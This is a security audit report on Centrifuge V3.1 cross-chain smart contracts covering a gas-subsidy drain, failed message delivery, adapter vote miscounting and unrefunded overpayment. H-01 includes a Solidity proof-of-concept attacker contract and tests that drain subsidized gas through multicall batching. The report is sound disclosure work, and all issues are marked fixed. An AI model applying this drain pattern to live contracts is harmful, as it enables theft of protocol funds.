![logo: BURRA SEC](page_1_image_1_v2.jpg)


# **Centrifuge V3.1 Protocol Security Review**


Reviewed by: Goran Vladika, SpicyMeatball, KlosMitSoss, c3phas

24th Sept - 30th Sept, 2025

---

Centrifuge V3.1 Protocol Security Review Report | October 12, 2025

## Centrifuge V3.1 Protocol Security Review Report

Burra Security

### **Introduction**

A time-boxed security review of the **Centrifuge V3.1** protocol was done by **Burra Security** team, focusing on the security aspects of the smart contracts.

### **Disclaimer**

A smart contract security review can never verify the complete absence of vulnerabilities. This is a time, resource, and expertise-bound effort where we try to find as many vulnerabilities as possible. We can not guarantee 100% security after the review or even if the review will find any vulnerabilities. Subsequent security reviews, bug bounty programs, and on-chain monitoring are recommended.

### **About Burra Security**

Burra Sec offers security auditing and advisory services with a special focus on cross-chain and interoperability protocols and their integrations.

### **About Centrifuge V3.1**

Centrifuge is an open, decentralized protocol for onchain asset management. Built on immutable smart contracts, it enables permissionless deployment of customizable tokenization products.

Burra Security | 2

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

Build a wide range of use cases, from permissioned funds to onchain loans, while enabling fast, secure deployment. ERC-4626 and ERC-7540 vaults allow seamless integration into DeFi.

Using protocol-level chain abstraction, tokenization issuers access liquidity across any network, all managed from one Hub chain of their choice.

## Severity classification

<table>
<thead>
<tr><th>Severity</th><th>Impact: High</th><th>Impact: Medium</th><th>Impact: Low</th></tr>
</thead>
<tbody>
<tr><td><b><b>Likelihood: High</b></b></td><td>Critical</td><td>High</td><td>Medium</td></tr>
<tr><td><b><b>Likelihood: Medium</b></b></td><td>High</td><td>Medium</td><td>Low</td></tr>
<tr><td><b><b>Likelihood: Low</b></b></td><td>Medium</td><td>Low</td><td>Low</td></tr>
</tbody>
</table>

**Impact** - The technical, economic, and reputation damage from a successful attack

**Likelihood** - The chance that a particular vulnerability gets discovered and exploited

**Severity** - The overall criticality of the risk

**Informational** - Findings in this category are recommended changes for improving the structure, usability, and overall effectiveness of the system.

## Security Assessment Summary

**_review commit hash_ - [ed9dc5beab9756e1c1fb44ee3fc127ce420db21b](https://github.com/centrifuge/protocol-v3/tree/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b)**

### **Scope**

The following smart contracts were in the scope of the audit:

- src/common/Gateway.sol
- src/common/MultiAdapter.sol
- src/common/GasService.sol
- src/common/MessageDispatcher.sol
- src/common/MessageProcessor.sol
- src/adapters/*.sol (excluding the LayerZero adapter)

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> | <u>October 12, 2025</u>

## Findings Summary

<table>
<thead>
<tr><th>ID</th><th>Title</th><th>Severity</th><th>Status</th></tr>
</thead>
<tbody>
<tr><td>H-1</td><td>Multicalls can be used to drain subsidized gas tokens from the gateway</td><td>High</td><td>Resolved</td></tr>
<tr><td>H-2</td><td>Cross-chain messages fail automatic delivery</td><td>High</td><td>Resolved</td></tr>
<tr><td>M-1</td><td>Pending votes of global adapters might not be deleted when setting<br />pool specific adapters leading to early message execution</td><td>Medium</td><td>Resolved</td></tr>
<tr><td>M-2</td><td>Caller not refunded when sending the previously underpaid message</td><td>Medium</td><td>Resolved</td></tr>
<tr><td>L-1</td><td>Multicall cannot batch multiple payable operations</td><td>Low</td><td>Resolved</td></tr>
<tr><td>I-1</td><td>Missing global adapter fallback in view functions</td><td>Info</td><td>Resolved</td></tr>
<tr><td>I-2</td><td>SetPoolAdapters batches with global actions, but pays from target<br />pool’s subsidy</td><td>Info</td><td>Resolved</td></tr>
</tbody>
</table>

## Detailed Findings

## **[H-01] Multicalls can be used to drain subsidized gas tokens from the gateway**

### **Target**

- [VaultRouter.sol#L57](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/vaults/VaultRouter.sol#L57)
- [Hub.sol#L89](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/hub/Hub.sol#L89)
- [Gateway.sol#L170](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/Gateway.sol#L170)

### **Severity**

- Impact: High
- Likelihood: High

### **Description**

An attacker can exploit batching mode in the <span style="color:#435489">Gateway.send()</span> function to send messages without paying for them, causing the gateway to cover delivery costs. In non-batching mode, <span style="color:#435489">send()</span> returns



4

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> | <u>October 12, 2025</u>

the actual cost of the message:

```solidity
1      function send(uint16 centrifugeId, bytes calldata message, uint128
          extraGasLimit)
2          external
3          pauseable
4          auth
5          returns (uint256)
6      {
7          require(message.length > 0, EmptyMessage());

8
9          PoolId poolId = processor.messagePoolId(message);
10         emit PrepareMessage(centrifugeId, poolId, message);
11
12         uint128 gasLimit = gasService.messageGasLimit(centrifugeId,
              message) + extraGasLimit;
13         if (isBatching) {
14              /// BATCH AND APPEND TSTORE
15             TransientBytesLib.append(batchSlot, message);
16     >>>     return 0;
17         } else {
18             return _send(centrifugeId, message, gasLimit);
19         }
20     }
```

In batching mode, the function always returns 0. If an attacker can cause the gateway to enter batching mode, they can submit messages that appear to cost nothing, while the gateway itself pays the delivery cost. Batching can be enabled through permissionless multicall entrypoints such as `VaultRouter.multicall()` or `Hub.multicall()`:

```solidity
1      function multicall(bytes[] calldata data) public payable override(
          Multicall, IMulticall) {
2          bool wasBatching = gateway.isBatching();
3          if (!wasBatching) {
4  >>>         gateway.startBatching();
5          }

6
7          super.multicall(data);

8
9          if (!wasBatching) {
10 >>>        gateway.endBatching();
11         }
12     }
```

From there, attackers can exploit free calls: - in `Hub`, they can call functions like `notifyDeposit()` or `notifyRedeem()` at no cost; - in `VaultRouter`, they can interact with arbitrary vaults, including malicious ones, which could call `Spoke.crosschainTransferShares` and shift the cost burden to the gateway:



5

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

```solidity
1   <span style="color:#435489">function enable(IBaseVault vault) public protected {</span>
2       <span style="color:#435489">vault.setEndorsedOperator(msg.sender, true);</span>
3   }
4
5   <span style="color:#435489">function disable(IBaseVault vault) external protected {</span>
6       <span style="color:#435489">vault.setEndorsedOperator(msg.sender, false);</span>
7   }
```


For example, the normal logic in <code style="color:#435489">Spoke.crosschainTransferShares</code> ensures the caller pays for gas via <code style="color:#435489">depositSubsidy</code>. However, in batching mode, <code style="color:#435489">send()</code> reports 0 cost, so the caller bypasses payment while the gateway covers it:


```solidity
1   <span style="color:#435489">function crosschainTransferShares(</span>
2       <span style="color:#435489">uint16 centrifugeId,</span>
3       <span style="color:#435489">PoolId poolId,</span>
4       <span style="color:#435489">ShareClassId scId,</span>
5       <span style="color:#435489">bytes32 receiver,</span>
6       <span style="color:#435489">uint128 amount,</span>
7       <span style="color:#435489">uint128 extraGasLimit,</span>
8       <span style="color:#435489">uint128 remoteExtraGasLimit</span>
9   ) public payable protected {
10      <span style="color:#435489">IShareToken share = IShareToken(shareToken(poolId, scId));</span>
11      <span style="color:#435489">require(centrifugeId != sender.localCentrifugeId(),</span>
        <span style="color:#435489">LocalTransferNotAllowed());</span>
12      <span style="color:#435489">require(</span>
13          <span style="color:#435489">share.checkTransferRestriction(msg.sender, address(uint160(</span>
            <span style="color:#435489">centrifugeId)), amount),</span>
14          <span style="color:#435489">CrossChainTransferNotAllowed()</span>
15      <span style="color:#435489">);</span>
16
17      <span style="color:#435489">share.authTransferFrom(msg.sender, msg.sender, address(this),</span>
        <span style="color:#435489">amount);</span>
18      <span style="color:#435489">share.burn(address(this), amount);</span>
19
20      <span style="color:#435489">emit InitiateTransferShares(centrifugeId, poolId, scId, msg.</span>
        <span style="color:#435489">sender, receiver, amount);</span>
21
>>> 22      <span style="color:#435489">gateway.depositSubsidy{value: msg.value}(poolId);</span>
23      <span style="color:#435489">uint256 cost = sender.sendInitiateTransferShares(</span>
24          <span style="color:#435489">centrifugeId, poolId, scId, receiver, amount, extraGasLimit</span>
            <span style="color:#435489">, remoteExtraGasLimit</span>
25      <span style="color:#435489">);</span>
>>> 26      <span style="color:#435489">require(msg.value >= cost, NotEnoughGas());</span>
27      if <span style="color:#435489">(msg.value > cost) gateway.withdrawSubsidy(poolId, msg.</span>
        <span style="color:#435489">sender, msg.value - cost);</span>
28  }
```





6

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>

<u>October 12, 2025</u>

## **Proof of concept**

Use <span style="color:#435489">`Gateway.t.sol`</span>.

First we need some imports:

```solidity
1  import {VaultRouter} from "../../../src/vaults/VaultRouter.sol";
2  import {Spoke, IPoolEscrowFactory, IPoolEscrow, ShareClassId} from "
       ../../../src/spoke/Spoke.sol";
3  import {TokenFactory, ShareToken} from "../../../src/spoke/factories/
       TokenFactory.sol";
4  import {MessageDispatcher, ITokenRecoverer} from "../../../src/common/
       MessageDispatcher.sol";
5  import {Hub, IHubRegistry, IHoldings, IAccounting, IHubHelpers,
       IMultiAdapter, IShareClassManager, AssetId} from "../../../src/hub/
       Hub.sol";
```

And mocks:

```solidity
1  contract MockHubHelper {
2      function notifyDeposit(PoolId, ShareClassId, AssetId, bytes32,
           uint32)
3          external
4          returns (uint128, uint128, uint128) {
5              return (1, 1, 1);
6          }
7  }
8
9  contract MockAdapter {
10     function estimate(uint16, bytes memory, uint256) external view
           returns(uint256) {
11         return 0.1 ether;
12     }
13
14     function send(uint16, bytes memory, uint256, address) external
           payable returns(bytes32) {
15         //
16     }
17 }
18
19 contract MockEscrow {}
20 contract MockEscrowFactory {
21     IPoolEscrow public lastEscrow;
22
23     function escrow(PoolId poolId) external view returns (IPoolEscrow)
           {
24         address e = address(
25             uint160( // downcast to 20 byte address
26                 uint256(
27                     keccak256(
28                         abi.encodePacked(
```



7

Burra Security

---

Centrifuge V3.1 Protocol Security Review Report

October 12, 2025

```solidity
29                                  bytes1(0xff),
30                                  address(this),
31                                  bytes32(uint256(poolId.raw())),
32                                  type(MockEscrow).creationCode
33                              )
34                          )
35                      )
36                  )
37              );
38              return IPoolEscrow(e);
39          }
40
41      function newEscrow(PoolId poolId) external returns (IPoolEscrow) {
42          IPoolEscrow lastEscrow_ = IPoolEscrow(address(
43              new MockEscrow{salt: bytes32(uint256(poolId.raw()))}()));
44          return lastEscrow;
45      }
46  }
```

Additional tweaks for the mock processor:


```solidity
 1      function messagePoolId(bytes calldata message) external pure
            returns (PoolId) {
 2          if (message.toUint8(0) == uint8(MessageKind.WithPool0)) return
                POOL_0;
 3          if (message.toUint8(0) == uint8(MessageKind.WithPoolA1)) return
                POOL_A;
 4          if (message.toUint8(0) == uint8(MessageKind.WithPoolA2)) return
                POOL_A;

 5
 6  >>>     if(message.toUint8(0) == uint8(22)) return POOL_A;
 7  >>>     if(message.toUint8(0) == uint8(33)) return POOL_A;
 8          revert("Unreachable: message never asked for pool");
 9      }

10
11      function messagePoolIdPayment(bytes calldata message) external pure
            returns (PoolId) {
12          if (message.toUint8(0) == uint8(MessageKind.WithPool0)) return
                POOL_A;
13          if (message.toUint8(0) == uint8(MessageKind.WithPoolA1)) return
                POOL_A;
14          if (message.toUint8(0) == uint8(MessageKind.WithPoolA2)) return
                POOL_A;

15
16  >>>     if(message.toUint8(0) == uint8(22)) return POOL_A;
17  >>>     if(message.toUint8(0) == uint8(33)) return POOL_A;

18
19          revert("Unreachable: message never asked for pool");
20      }
```

Attacker contract:



8

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

```solidity
1  contract Bandit {
2      Spoke target;
3      PoolId poolId = POOL_A;
4      ShareClassId sc = ShareClassId.wrap(bytes16("sc1"));
5      uint16 REMOTE_CENT_ID = 24;
6
7      constructor(Spoke _target) {
8          target = _target;
9      }
10
11     function setEndorsedOperator(address, bool) external {
12         attack(target);
13     }
14
15     function attack(Spoke _target) internal {
16         _target.crosschainTransferShares{value: 0}(REMOTE_CENT_ID,
                poolId, sc, bytes32(0), 0,  1, 1);
17     }
18 }
```


Setup storage:


```solidity
1  // -----------------------------------------
2  //      GATEWAY TESTS
3  // -----------------------------------------
4
5  contract GatewayTest is Test {
6      uint16 constant LOCAL_CENT_ID = 23;
7      ---ADD THIS---
8      MockEscrowFactory mockEscrowFactory;
9      MessageDispatcher messageDispatcher;
10     VaultRouter vaultRouter;
11     TokenFactory tokenFactory;
12     Spoke spoke;
13     MockAdapter mockAdapter;
14     Hub hub;
15     MockHubHelper mockHubHelper;
16
17     PoolId poolId = POOL_A;
18     ShareClassId sc = ShareClassId.wrap(bytes16("sc1"));
```


Setup:


```solidity
1      function setUp() public {
2          mockAdapter = new MockAdapter();
3          mockEscrowFactory = new MockEscrowFactory();
4          messageDispatcher = new MessageDispatcher(
5              uint16(23),
6              root,
7              gateway,
```



9

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>	<u>October 12, 2025</u>

```solidity
 8              ITokenRecoverer(address(0)),
 9              address(this)
10          );
11          mockHubHelper = new MockHubHelper();
12          hub = new Hub(
13              gateway,
14              IHoldings(address(0)),
15              IHubHelpers(address(mockHubHelper)),
16              IAccounting(address(0)),
17              IHubRegistry(address(0)),
18              IMultiAdapter(address(mockAdapter)),
19              IShareClassManager(address(0)),
20              address(this)
21          );
22          tokenFactory = new TokenFactory(address(root), address(this));
23          spoke = new Spoke(tokenFactory, address(this));
24          vaultRouter = new VaultRouter(address(0), gateway, spoke,
                address(this));

25
26          spoke.file("gateway", address(gateway));
27          spoke.file("sender", address(messageDispatcher));
28          hub.file("sender", address(messageDispatcher));
29          spoke.file("poolEscrowFactory", address(mockEscrowFactory));
30          gateway.rely(address(vaultRouter));
31          gateway.rely(address(messageDispatcher));
32          gateway.rely(address(spoke));
33          gateway.rely(address(hub));
34          tokenFactory.rely(address(spoke));
35          messageDispatcher.rely(address(spoke));
36          messageDispatcher.rely(address(hub));

37
38          gateway.file("adapter", address(mockAdapter));
39          gateway.file("processor", address(processor));

40
41          // make pool active
42          spoke.addPool(poolId);

43
44          // add a share class through factory
45          spoke.addShareClass(
46              poolId,
47              sc,
48              "Test Share",
49              "TSH",
50              18,
51              bytes32(0),
52              address(0) // no hook
53          );
54          // now we have a *real* ERC20-like IShareToken deployed
55          ShareToken shareToken = ShareToken(address(spoke.shareToken(
                poolId, sc)));
56          vm.prank(address(root));
```

Burra Security	10

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

```solidity
57            shareToken.rely(address(spoke));
58
59            gateway.depositSubsidy{value: 0.1 ether}(poolId);
60
61            _mockPause(false);
62            _mockGasService();
63       }
```

And finally the tests:

```solidity
1  contract GatewayTestReceive is GatewayTest {
2      function testAudit1() public {
3          address alice = address(0xa11ce);
4          Bandit bandit = new Bandit(spoke);
5          bytes memory payload = abi.encodeWithSignature("enable(address)", address(bandit));
6          bytes[] memory payloads = new bytes;
7          payloads[0] = payload;
8          console2.log("GATEWAY BAL BEFORE: ", address(gateway).balance);
9          // ATTACK
10         vm.prank(alice);
11         vaultRouter.multicall(payloads);
12         console2.log("GATEWAY BAL AFTER: ", address(gateway).balance);
13     }

14
15     function testAudit2() public {
16         bytes memory payload = abi.encodeWithSignature(
17             "notifyDeposit(uint64,bytes16,uint128,bytes32,uint32)",
18             poolId,
19             sc,
20             AssetId.wrap(1),
21             bytes32("investooor"),
22             1
23         );
24         bytes[] memory payloads = new bytes;
25         payloads[0] = payload;
26         console2.log("GATEWAY BAL BEFORE: ", address(gateway).balance);
27         hub.multicall{value: 0}(payloads);
28         console2.log("GATEWAY BAL AFTER: ", address(gateway).balance);
29     }
```

## Recommendation

One approach is to sum costs inside `endBatching()` and return the total:

```solidity
1  +   function endBatching() external auth returns(uint256 cost){
2          require(isBatching, NoBatched());
3          bytes32[] memory locators = TransientArrayLib.getBytes32(
                BATCH_LOCATORS_SLOT);
```



11

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> <u>October 12, 2025</u>

```text
  4
  5          <span style="color:#435489">isBatching</span> = <span style="color:#435489">**false**</span>;
  6          <span style="color:#435489">TransientArrayLib.clear(BATCH_LOCATORS_SLOT);</span>
  7
  8          <span style="color:#435489">**for**</span> (<span style="color:#435489">uint256 i; i &lt; locators.length; i++</span>) {
  9              (<span style="color:#435489">uint16 centrifugeId, PoolId poolId</span>) = <span style="color:#435489">_parseLocator(</span>
                  <span style="color:#435489">locators[i]);</span>
 10              <span style="color:#435489">bytes32 outboundBatchSlot = _outboundBatchSlot(centrifugeId</span>
                  <span style="color:#435489">, poolId);</span>
 11              <span style="color:#435489">uint128 gasLimit = _gasLimitSlot(centrifugeId, poolId).</span>
                  <span style="color:#435489">tloadUint128();</span>
 12
 13          + <span style="color:#435489">cost += _send(centrifugeId, TransientBytesLib.get(</span>
        <span style="color:#435489">outboundBatchSlot), gasLimit);</span>
 14
 15              <span style="color:#435489">TransientBytesLib.clear(outboundBatchSlot);</span>
 16              <span style="color:#435489">_gasLimitSlot(centrifugeId, poolId).tstore(uint256(0));</span>
 17          }
 18      }
```

At the end of multicall, compare <span style="color:#435489">`msg.value`</span> against <span style="color:#435489">`totalCost`</span>. Since only permissionless calls should require the caller to pay gas, add a conditional check in multicall to ensure trusted, protocol-owned calls can still leverage pool subsidies.

**Client**

Fixed in https://github.com/centrifuge/protocol/pull/636.

**BurraSec**

Verified. The subsidy mechanism has been removed. Messages are now paid **for** by callers upfront, eliminating the possibility of the attack.

## **[H-02] Cross-chain messages fail automatic delivery**

**Target**

- [Gateway.sol#L113](https://github.com/centrifuge/protocol/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/Gateway.sol#L113)

**Severity**

- Impact: Medium



12

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

- Likelihood: High

## **Description**

The Gateway’s [handle()](https://github.com/centrifuge/protocol/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/Gateway.sol#L104) function requires incoming messages to have enough gas for both execution and failure storage:

```
uint256 executionGas = gasService.messageGasLimit(localCentrifugeId,
    message);
require(gasleft() >= executionGas + GAS_FAIL_MESSAGE_STORAGE,
    NotEnoughGasToProcess());
```

The left part of comparison, `gasleft()`, starts as destination leg’s TX `gasLimit` and decreases from there. The value of destination leg `gasLimit` is determined and paid for on the source chain:

```
uint128 gasLimit = gasService.messageGasLimit(centrifugeId, message) +
    extraGasLimit;
...
_send(centrifugeId, message, gasLimit)
```

On the right side of comparison, the `executionGas` equals the `messageGasLimit()`. Thus we can say that comparison:

```
gasleft() >= executionGas + GAS_FAIL_MESSAGE_STORAGE
```

is equivalent to

```
messageGasLimit(MSG_X) + extraGasLimit >= messageGasLimit(MSG_X) +
    GAS_FAIL_MESSAGE_STORAGE
```

We can see that for the receive-side check to pass, `extraGasLimit` must be at least 40,000 (in practice even more to account for the already spent gas). But throughout MessageDispatcher, almost all messages are sent with `extraGasLimit = 0`:

- sendNotifyPool
- sendNotifyShareClass
- sendRegisterAsset
- sendSetRequestManager
- sendMaxAssetPriceAge

All cross-chain messages sent with `extraGasLimit = 0` will fail automatic execution on the destination chain. While bridges like Wormhole, LayerZero, and Axelar support manual retry with additional gas, this breaks the automatic message flow and requires manual intervention for each message. This effectively makes the cross-chain messaging system non-functional without constant manual recovery



13

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

operations. Additionally, every failed automatic execution wastes the protocol’s subsidy funds and more funds need to be spent to retry the execution with higher gas limits.

## **Proof of Concept**

This simple test showcases the issue. We call <span style="color:#435489">gateway.handle</span> with the gas service’s provided gas limit for the msg. That should be enough, however due to the described bug TX reverts with <span style="color:#435489">NotEnoughGasToProcess</span>:

```solidity
// Gateway.t.sol
function testMessage_POC() public {
    bytes memory message = MessageKind.WithPool0.asBytes();

    // This is the gas limit that would be paid for on the source
    // chain and used on the destination chain
    uint256 messageGasLimit = gasService.messageGasLimit(
        LOCAL_CENT_ID, message);

    // Call the handle with expected gas limit. TX should succeed,
    // however it fails due to overrestrictive check
    gateway.handle{gas: messageGasLimit}(REMOTE_CENT_ID, message);
}
```

## **Recommendation**

It is enough check that gas left is at least <span style="color:#435489">GAS_FAIL_MESSAGE_STORAGE</span>, in order to cover for failure processing:

```solidity
require(gasleft() >= GAS_FAIL_MESSAGE_STORAGE, NotEnoughGasToProcess())
;
```

## **Client**

Fixed here: https://github.com/centrifuge/protocol/pull/646

## **BurraSec**

Fix verified. Recommended mitigation implemented.



14

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> <span style="color:#000000"></span><u>October 12, 2025</u>

# [M-01] Pending votes of global adapters might not be deleted when setting pool specific adapters leading to early message execution

## **Target**


- [MultiAdapter.sol](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/MultiAdapter.sol#L75)

## **Severity**


- Impact: High


- Likelihood: Low

## **Description**


Inside <span style="color:#435489">MultiAdapter::handle()</span>, when no pool-specific adapters are set, the global set of adapters will be used instead to sign off on a message. The message will then be executed when a certain threshold is met, for example, when 2/3 adapters have signed off on a specific message. When <span style="color:#435489">MultiAdapter::setAdapters()</span> is called to set new adapters for a pool, the session ID is incremented to reset pending votes:


```solidity
  1          // Increment session id to reset pending votes
  2          uint256 numAdapters = adapters[centrifugeId][poolId].length;
  3          uint64 sessionId = numAdapters > 0
  4              ? _adapterDetails[centrifugeId][poolId][adapters[
                    centrifugeId][poolId][0]].activeSessionId + 1
  5              : 0;
```


Note that when the pool-specific adapters are set for the first time, the <span style="color:#435489">sessionId</span> is set to zero as a default. The pending votes will be reset during the <span style="color:#435489">MultiAdapter::handle()</span> flow:


```solidity
  1          if (adapter.activeSessionId != state.sessionId) {
  2              // Clear votes from previous session
  3              delete state.votes;
  4              state.sessionId = adapter.activeSessionId;
  5          }
```


This if block will always be reached when new adapters are set while the pool already had pool-specific adapters set before. However, when the global set of adapters was used previously, it is possible that this if block will not be reached and the threshold will be met earlier than it should due to the pending votes including votes from the global adapters.



15

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>                                     <u>October 12, 2025</u>

Consider the following scenario, which will also be used in the POC: Currently, no pool-specific adapters are set, which means that the global set of adapters (Adapter1, Adapter2, Adapter3) is used with a configured threshold of three and <span style="color:#435489">`sessionId`</span> == 0. Adapter1 and Adapter2 sign off on a message, which means that the vote count will be increased to two and the <span style="color:#435489">`activeSessionId`</span> is 0.


Now, the specific pool adapters are set for the first time with Adapter4, Adapter5, and Adapter6. The threshold is also set to three. As described previously, the <span style="color:#435489">`sessionId`</span> defaults to 0. Now, when Adapter6 signs off on the same message, the if block is not reached due to <span style="color:#435489">`adapter.activeSessionId == state.sessionId`</span>. As a result, the vote count increases to three, which means that the threshold is met and the message is executed.


To run the POC, the following import needs to be added to <span style="color:#435489">`MultiAdapter.t.sol`</span>: **import** {<span style="color:#435489">`ArrayLib`</span>} <span style="color:#435489">from</span> <span style="color:#00999a">`"../../../src/misc/libraries/ArrayLib.sol"`</span>;. Now, this test needs to be added to the <span style="color:#435489">`MultiAdapterTestHandle`</span> contract in the <span style="color:#435489">`MultiAdapter.t.sol`</span> file:


```solidity
 1      function testGlobalAdaptersPendingVotesNotDeleted() public {
 2          // POOL_A is not configured, and MESSAGE_1 comes from POOL_A,
                but it works because POOL_0 is the default
 3          multiAdapter.setAdapters(REMOTE_CENT_ID, POOL_0, threeAdapters,
                 3, 3);
 4
 5          vm.prank(address(adapter1));
 6          multiAdapter.handle(REMOTE_CENT_ID, MESSAGE_1);
 7
 8          vm.prank(address(adapter2));
 9          multiAdapter.handle(REMOTE_CENT_ID, MESSAGE_1);
10
11          // adapters that POOL_A will be configured with
12          IAdapter adapter4 = IAdapter(makeAddr("Adapter4"));
13          IAdapter adapter5 = IAdapter(makeAddr("Adapter5"));
14          IAdapter adapter6 = IAdapter(makeAddr("Adapter6"));
15
16          IAdapter[] memory otherThreeAdapters = new IAdapter;
17          otherThreeAdapters[0] = adapter4;
18          otherThreeAdapters[1] = adapter5;
19          otherThreeAdapters[2] = adapter6;
20
21          // setting specific adapters for POOL_A
22          multiAdapter.setAdapters(REMOTE_CENT_ID, POOL_A,
                 otherThreeAdapters, 3, 3);
23
24          // needed for vote counting
25          bytes32 payloadHash = keccak256(MESSAGE_1);
26          uint8 quorum = multiAdapter.quorum(REMOTE_CENT_ID, POOL_A);
27          int16[8] memory votes = multiAdapter.votes(REMOTE_CENT_ID,
                 payloadHash);
28
```



16

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>

<u>October 12, 2025</u>

```
  29         // currently 2 votes
  30         assertEq(ArrayLib.countPositiveValues(votes, quorum), 2);
  31
  32         vm.prank(address(adapter6));
  33         multiAdapter.handle(REMOTE_CENT_ID, MESSAGE_1);
  34
  35         // now 0 votes due to threshold reached
  36         votes = multiAdapter.votes(REMOTE_CENT_ID, payloadHash);
  37         assertEq(ArrayLib.countPositiveValues(votes, quorum), 0);
  38     }
```


**Recommendation**


Assign an id that’s stored globally and increment it each time <span style="color:#435489">`setAdapters()`</span> is called:


```
  1              // Ids are assigned sequentially starting at 1
  2              _adapterDetails[centrifugeId][poolId][addresses[j]] =
  3                  Adapter(j + 1, quorum_, threshold_, recoveryIndex_, id)
                        ;
  4          }
  5          /// END OF LOOP
  6          ++id;
```


**Client**


Fixed in https://github.com/centrifuge/protocol/pull/648


**BurraSec**


Fix verified. Using and tracking <span style="color:#435489">`globalSessionId`</span> solved the issue.


# **[M-02] Caller not refunded when sending the previously underpaid message**


**Target**


- [Gateway.sol](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/Gateway.sol#L215..L230)



17

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u> <u>October 12, 2025</u>

## **Severity**

- Impact: Medium
- Likelihood: Medium

## **Description**

When someone tries to send a msg while there is no enough funds in the pool to pay for transfer, then msg is stored in <span style="color:#435489">underpaid</span>. From there it can be executed by anyone calling [repay](https://github.com/centrifuge/protocol-v3/blob/ed9dc5beab9756e1c1fb44ee3fc127ce420db21b/src/common/Gateway.sol#L215), as long as caller provides the funds to cover the transfer cost. The problem is that if caller overpays for the transfer cost the difference is not refunded, but it is kept by the Gateway.

The likelihood of caller overpaying the transfer is significant because caller does cost estimation beforehand, separately from execution TX. The cost depends on the gas price which can easily change between the estimation and the actual execution time. Caller is even incentivized to add a small value buffer just in case, which further increases the likelihood of transfer being overpaid.

## **Proof of concept**

This test can be added to <span style="color:#435489">Gateway.t.sol</span>:

```solidity
function testRepayOverpaid_NoRefund() public {
    gateway.setRefundAddress(POOL_A, POOL_REFUND);
    bytes memory message = MessageKind.WithPoolA1.asBytes();

    //// 1. Send message, underpaid
    // mock adapter::send
    vm.mockCall(
        address(adapter),
        abi.encodeWithSelector(IAdapter.send.selector,
            REMOTE_CENT_ID, message, MESSAGE_GAS_LIMIT, POOL_REFUND),
        abi.encode(ADAPTER_DATA)
    );
    // gas price at send time is 12 gwei
    vm.mockCall(
        address(adapter),
        abi.encodeWithSelector(IAdapter.estimate.selector,
            REMOTE_CENT_ID, message, MESSAGE_GAS_LIMIT),
        abi.encode(12 gwei * MESSAGE_GAS_LIMIT)
    );
    // send msg with insufficient subsidy
    gateway.send(REMOTE_CENT_ID, message, 0);
    // assert underpaid msg is stored
```



18

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

```solidity
21         (, uint64 counter) = gateway.underpaid(REMOTE_CENT_ID,
               keccak256(message));
22         assertEq(counter, 1);
23
24         //// 2. Estimate the cost for repaying the message
25         // gas price at estimation time is 15 gwei
26         vm.mockCall(
27             address(adapter),
28             abi.encodeWithSelector(IAdapter.estimate.selector,
                   REMOTE_CENT_ID, message, MESSAGE_GAS_LIMIT),
29             abi.encode(15 gwei * MESSAGE_GAS_LIMIT)
30         );
31         uint256 estimatedCost = gateway.adapter().estimate(
               REMOTE_CENT_ID, message, MESSAGE_GAS_LIMIT);
32
33         /// 3. Repay with estimated cost, but actual cost dropped due
               to gas price change
34         // gas price at repay time is 10 gwei
35         uint256 actualCost = 10 gwei * MESSAGE_GAS_LIMIT;
36         vm.mockCall(
37             address(adapter),
38             abi.encodeWithSelector(IAdapter.estimate.selector,
                   REMOTE_CENT_ID, message, MESSAGE_GAS_LIMIT),
39             abi.encode(actualCost)
40         );
41         // snapshot repayer balance before repay
42         address repayer = makeAddr("repayer");
43         vm.deal(repayer, estimatedCost);
44         uint256 initialRepayerBalance = repayer.balance;
45         console2.log("Repayer balance before repay:",
               initialRepayerBalance);
46         console2.log("Estimated cost:", estimatedCost);
47         console2.log("Actual cost:", actualCost);
48         // repay with overpayment
49         vm.prank(repayer);
50         gateway.repay{value: estimatedCost}(REMOTE_CENT_ID, message);
51         // assert underpaid msg was sent
52         (, counter) = gateway.underpaid(REMOTE_CENT_ID, keccak256(
               message));
53         assertEq(counter, 0);
54
55         /// 4. No refund happens, the overpaid amount is kept by the
               gateway
56         console2.log("Expected repayer balance after:",
               initialRepayerBalance - actualCost);
57         console2.log("Actual repayer balance after:", repayer.balance);
58     }
```

Running the **test** confirms the issue:

```bash
forge test --mt testRepayOverpaid_NoRefund -vvv
```



19

Burra Security

---

<u>Centrifuge V3.1 Protocol Security Review Report</u>
<u>October 12, 2025</u>

```text
   2
   3  Ran 1 test for test/common/unit/Gateway.t.sol:GatewayTestRepay
   4  [PASS] testRepayOverpaid_NoRefund() (gas: 126697)
   5  Logs:
   6    Repayer balance before repay: 1500000000000000
   7    Estimated cost: 1500000000000000
   8    Actual cost: 1000000000000000
   9    Expected repayer balance after: 500000000000000
  10    Actual repayer balance after: 0
```

### **Recommendation**

